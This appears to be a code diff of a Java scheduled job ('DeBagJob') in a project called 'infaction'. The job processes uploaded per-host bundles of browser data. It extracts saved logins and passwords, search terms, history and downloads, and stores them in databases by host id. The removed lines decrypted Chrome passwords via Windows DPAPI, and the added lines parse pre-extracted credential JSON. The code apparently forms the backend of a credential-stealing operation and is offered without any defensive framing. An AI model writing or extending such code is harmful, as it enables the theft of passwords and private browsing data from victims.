@@ -1,5 +1,6 @@
 package com.jimmy.infaction.job;
 
+import com.fasterxml.jackson.databind.ObjectMapper;
 import com.jimmy.infaction.common.*;
 import com.jimmy.infaction.pojo.*;
 import com.jimmy.infaction.service.*;
@@ -10,38 +11,44 @@ import org.quartz.JobExecutionException;
 import org.quartz.SchedulerException;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.context.ApplicationContext;
 
 
-import java.io.File;
+import java.io.*;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 
 /**
  * @author jimmy on 2019/9/26 17:50
  */
 public class DeBagJob  implements  Job {
+
 	private static Logger log = LoggerFactory.getLogger(DeBagJob.class);
+
 	@Override
 	public void execute(JobExecutionContext jobContext) throws JobExecutionException {
-		ApplicationContext applicationContext=null;
+		ApplicationContext applicationContext = null;
 		try {
 			//get sping context
-			applicationContext=getApplicationContext(jobContext);
+			applicationContext = getApplicationContext(jobContext);
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 		//find xml register beanservice
+		ObjectMapper jsonMapper = (ObjectMapper) applicationContext.getBean("jsonMapper");
 		BrowserFailService browserFailService = (BrowserFailService) applicationContext.getBean("browserFailService");
 		BrowserService browserService = (BrowserService) applicationContext.getBean("browserService");
 		BrowserDownloadService browserDownloadService = (BrowserDownloadService) applicationContext.getBean("browserDownloadService");
 		BrowserKeywordService browserKeywordService = (BrowserKeywordService) applicationContext.getBean("browserKeywordService");
 		BrowserUrlService browserUrlService = (BrowserUrlService) applicationContext.getBean("browserUrlService");
-//		String rootPath = "F:\\workspace\\infaction\\upload\\";
-		String rootPath = "/opt/tomcat/webapps/ROOT/upload/";
+		String rootPath = "F:\\workspace\\infaction\\upload\\";
+//		String rootPath = "/opt/tomcat/webapps/upload/";
 		File dir = new File(rootPath);
 		File[] files = dir.listFiles();
+
 		for (File f : files) {
 			//need to check mysql browser_faild  hostid if submit again clear the faild record
 			if (!(f.getName().matches(".*.zip"))) {
@@ -51,29 +58,40 @@ public class DeBagJob  implements  Job {
 				for (File ff : f.listFiles()) {
 					int num = 10; //初始线程数
 					try {
-						switch (ff.getName()){
-							case "Login Data":
-								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"/"+"Login Data");
-								List<SqlLiteDemoResult> LoginList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
-								int Llength = LoginList.size();
-								int LbaseNum = Llength / num;
-								int LremainderNum = Llength % num;
-								int Lend = 0;
-								// every thread process get the same length but different data
-								for (int li = 0; li < num; li++) {
-									int start = Lend;
-									Lend = start + LbaseNum;
-									if (li == (num - 1)) {
-										Lend = Llength;
-									} else if (li < LremainderNum) {
-										Lend = Lend + 1;
+						switch (ff.getName()) {
+							case "login.txt":
+								File file = new File(rootPath + ff.getName());
+								InputStreamReader read = null;
+								BufferedReader reader = null;
+								try {
+									read = new InputStreamReader(new FileInputStream(file), "utf-8");
+									reader = new BufferedReader(read);
+									String line;
+									while ((line = reader.readLine()) != null) {
+										if (line.equals("")) ;
+										else {
+											Browser browser = new Browser();
+											Map map = jsonMapper.readValue(line, Map.class);
+											browser.setOrigin_url((String) map.get("origin_url"));
+											browser.setAction_url((String) map.get("action_url"));
+											browser.setUser((String) map.get("user"));
+											browser.setPassword((String) map.get("password"));
+											browser.setHostid(f.getName());
+											browserService.insert(browser);
+										}
 									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (li + 1) + "] ", LoginList, start, Lend, f.getName(),browserService);
-									thread.start();
+									read.close();
+								} catch (UnsupportedEncodingException e) {
+									e.printStackTrace();
+								} catch (IOException e) {
+									e.printStackTrace();
+								} finally {
+									read.close();
 								}
 								break;
 							case "History":
-								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"/"+"History");
+//								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"/"+"History");
+								SqliteHelper hi = new SqliteHelper(rootPath + f.getName() + "\\" + "History");
 								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
 								int klength = HkList.size();
 								int kbaseNum = klength / num;
@@ -103,7 +121,7 @@ public class DeBagJob  implements  Job {
 									} else if (ki < remainderNum) {
 										end = end + 1;
 									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (ki + 1) + "] ", HList, start, end, f.getName(),browserUrlService);
+									ExecMultiBag thread = new ExecMultiBag("线程[" + (ki + 1) + "] ", HList, start, end, f.getName(), browserUrlService);
 									thread.start();
 								}
 								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
@@ -119,26 +137,35 @@ public class DeBagJob  implements  Job {
 									} else if (di < dremainderNum) {
 										dend = dend + 1;
 									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (di + 1) + "] ", HdList, start, dend, f.getName(),browserDownloadService);
+									ExecMultiBag thread = new ExecMultiBag("线程[" + (di + 1) + "] ", HdList, start, dend, f.getName(), browserDownloadService);
 									thread.start();
 								}
+								ff.delete();
 								break;
 //								System.out.println("----"+(System.currentTimeMillis() - start));
 							case "Cookies":
+//								ff.delete();
 								break;
 //								System.out.println(ff.getName());
 							default:
 								continue;
 						}
+
+//						File unzipbag = new File(rootPath + f.getName());
+//						if (unzipbag.exists()) {
+//							//must be empty directory
+//							unzipbag.delete();
+//						}
 					} catch (Exception e) {
 						e.printStackTrace();
 					}
 				}
-				f.delete();
 			}
 		}
 	}
+
 	private static final String APPLICATION_CONTEXT_KEY = "applicationContextKey";
+
 	private ApplicationContext getApplicationContext(JobExecutionContext jobContext) throws SchedulerException {
 		ApplicationContext appCtx = null;
 		appCtx = (ApplicationContext) jobContext.getScheduler().getContext().get(APPLICATION_CONTEXT_KEY);
@@ -147,52 +174,57 @@ public class DeBagJob  implements  Job {
 		}
 		return appCtx;
 	}
-	class ExecMultiBag extends Thread{
+
+	class ExecMultiBag extends Thread {
 		private String threadName;
-		private List<HistoryKeyResult> hklist ;
-		private List<HistoryUrlResult> hllist ;
-		private List<HistoryDownloadResult> hdlist ;
-		private List<SqlLiteDemoResult> Llist ;
+		private List<HistoryKeyResult> hklist;
+		private List<HistoryUrlResult> hllist;
+		private List<HistoryDownloadResult> hdlist;
+		private List<SqlLiteDemoResult> Llist;
 		private BrowserUrlService browserUrlService;
 		private BrowserDownloadService browserDownloadService;
 		private BrowserKeywordService browserKeywordService;
-		private  BrowserService browserService;
+		private BrowserService browserService;
 		private int startIndex;
 		private int endIndex;
-		private String hostid ;
-		public  ExecMultiBag(String threadName,List list,int startIndex, int endIndex, String hostid,Object service){
+		private String hostid;
+
+		public ExecMultiBag(String threadName, List list, int startIndex, int endIndex, String hostid, Object service) {
 			this.threadName = threadName;
 			this.hostid = hostid;
 			this.startIndex = startIndex;
 			this.endIndex = endIndex;
-			if (list.toString().matches("(.*)KeyResult(.*)")){
+			if (list.toString().matches("(.*)KeyResult(.*)")) {
 				this.hklist = list;
 				this.browserKeywordService = (BrowserKeywordService) service;
-			}else if(list.toString().matches("(.*)UrlResult(.*)")) {
+			} else if (list.toString().matches("(.*)UrlResult(.*)")) {
 				this.hllist = list;
 				this.browserUrlService = (BrowserUrlService) service;
-			}else if(list.toString().matches("(.*)DownloadResult(.*)")) {
+			} else if (list.toString().matches("(.*)DownloadResult(.*)")) {
 				this.hdlist = list;
 				this.browserDownloadService = (BrowserDownloadService) service;
-			} else if(list.toString().matches("(.*)SqlLiteDemoResult(.*)")) {
-				this.Llist = list;
-				this.browserService = (BrowserService) service;
 			}
-	}
+//			else if(list.toString().matches("(.*)SqlLiteDemoResult(.*)")) {
+//				this.Llist = list;
+//				this.browserService = (BrowserService) service;
+//			}
+		}
 
 		@Override
 		public void run() {
-			if (null != Llist) {
-				List<SqlLiteDemoResult> LList = Llist.subList(startIndex, endIndex);
-				for (SqlLiteDemoResult result : LList) {
-					Browser browser = new Browser();
-					browser.setWebsite(result.getAction_url());
-					browser.setUser(result.getUsername_value());
-					browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
-					browser.setHostid(hostid);
-					browserService.insert(browser);
-				}
-			} else if (null != hklist) {
+//			if (null != Llist) {
+//				List<SqlLiteDemoResult> LList = Llist.subList(startIndex, endIndex);
+//				for (SqlLiteDemoResult result : LList) {
+//					Browser browser = new Browser();
+//					browser.setWebsite(result.getAction_url());
+//					browser.setUser(result.getUsername_value());
+//					browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
+//					browser.setPassword(new String(result.getPassword_value()));
+//					browser.setHostid(hostid);
+//					browserService.insert(browser);
+//				}
+//			}
+			if (null != hklist) {
 				List<HistoryKeyResult> kList = hklist.subList(startIndex, endIndex);
 //				System.out.println(threadName + "处理了" + kList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
 				for (HistoryKeyResult result : kList) {
@@ -225,28 +257,4 @@ public class DeBagJob  implements  Job {
 			}
 		}
 	}
-//	class ExecMultiBag implements  Runnable{
-//		private List<HistoryKeyResult> hklist ;
-//		private BrowserKeywordService browserKeywordService = null;
-//		private String name ;
-//		public ExecMultiBag(List<HistoryKeyResult> hkList, BrowserKeywordService browserKeywordService, String name) {
-//			 this.hklist = hkList;
-//			 this.browserKeywordService = browserKeywordService;
-//			 this.name = name;
-//
-//		}
-//
-//		@Override
-//		public void run() {
-//			if(null!=hklist){
-//				for (HistoryKeyResult result : hklist) {
-//					Browser_keyword browser_keyword = new Browser_keyword();
-//					browser_keyword.setKey(result.getKey());
-//					browser_keyword.setHostid(name);
-//					browserKeywordService.insert(browser_keyword);
-//				}
-//			}
-//		}
-//	}
 }
-
